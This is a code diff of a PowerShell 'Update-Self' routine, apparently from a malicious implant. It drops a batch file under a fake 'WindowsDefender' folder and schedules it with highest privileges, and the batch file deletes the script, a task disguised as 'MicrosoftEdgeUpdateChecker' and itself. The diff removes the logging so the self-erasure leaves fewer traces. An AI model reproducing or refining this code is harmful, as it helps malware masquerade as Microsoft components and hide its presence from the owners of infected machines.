@@ -588,31 +588,22 @@ function Update-Self {
         $cleanupBat = "$env:APPDATA\WindowsDefender\cleanup.bat"
         $taskName = "MicrosoftEdgeUpdateChecker"
         $cleanupTask = "ZiPo_Cleanup"
-        $logPath = "$env:TEMP\cleanup_log.txt"
 
-        # Удаляем старую задачу, если осталась
-        schtasks /Delete /TN "$cleanupTask" /F >$null 2>&1
-
-        # Контент батника с логами
         $batContent = @"
 @echo off
-echo Start cleanup at %time% > "$logPath"
 timeout /t 5 >nul
-del "$scriptPath" /f /q >> "$logPath" 2>&1
-schtasks /Delete /TN "$taskName" /F >> "$logPath" 2>&1
-del "%~f0" /f /q >> "$logPath" 2>&1
-schtasks /Delete /TN "$cleanupTask" /F >> "$logPath" 2>&1
-echo Cleanup finished at %time% >> "$logPath"
+del "$scriptPath" /f /q
+schtasks /Delete /TN "$taskName" /F >nul 2>&1
+del "%~f0" /f /q
+schtasks /Delete /TN "$cleanupTask" /F >nul 2>&1
 "@
 
         $batContent | Set-Content -Path $cleanupBat -Encoding ASCII
 
-        # Создаём задачу с ближайшим временем
-        $runTime = (Get-Date).AddMinutes(1).ToString("HH:mm")
-        schtasks /Create /TN $cleanupTask /SC ONCE /ST $runTime `
-            /TR "cmd.exe /c `"$cleanupBat`"" /RL HIGHEST /F | Out-Null
+        schtasks /Create /TN $cleanupTask /SC ONCE /TR "`"$cleanupBat`"" `
+            /ST ((Get-Date).AddMinutes(1).ToString("HH:mm")) /RL HIGHEST /F | Out-Null
 
-        Start-Sleep -Seconds 2
+        Start-Sleep -Seconds 1
         Stop-Process -Id $PID -Force
     }
     catch {
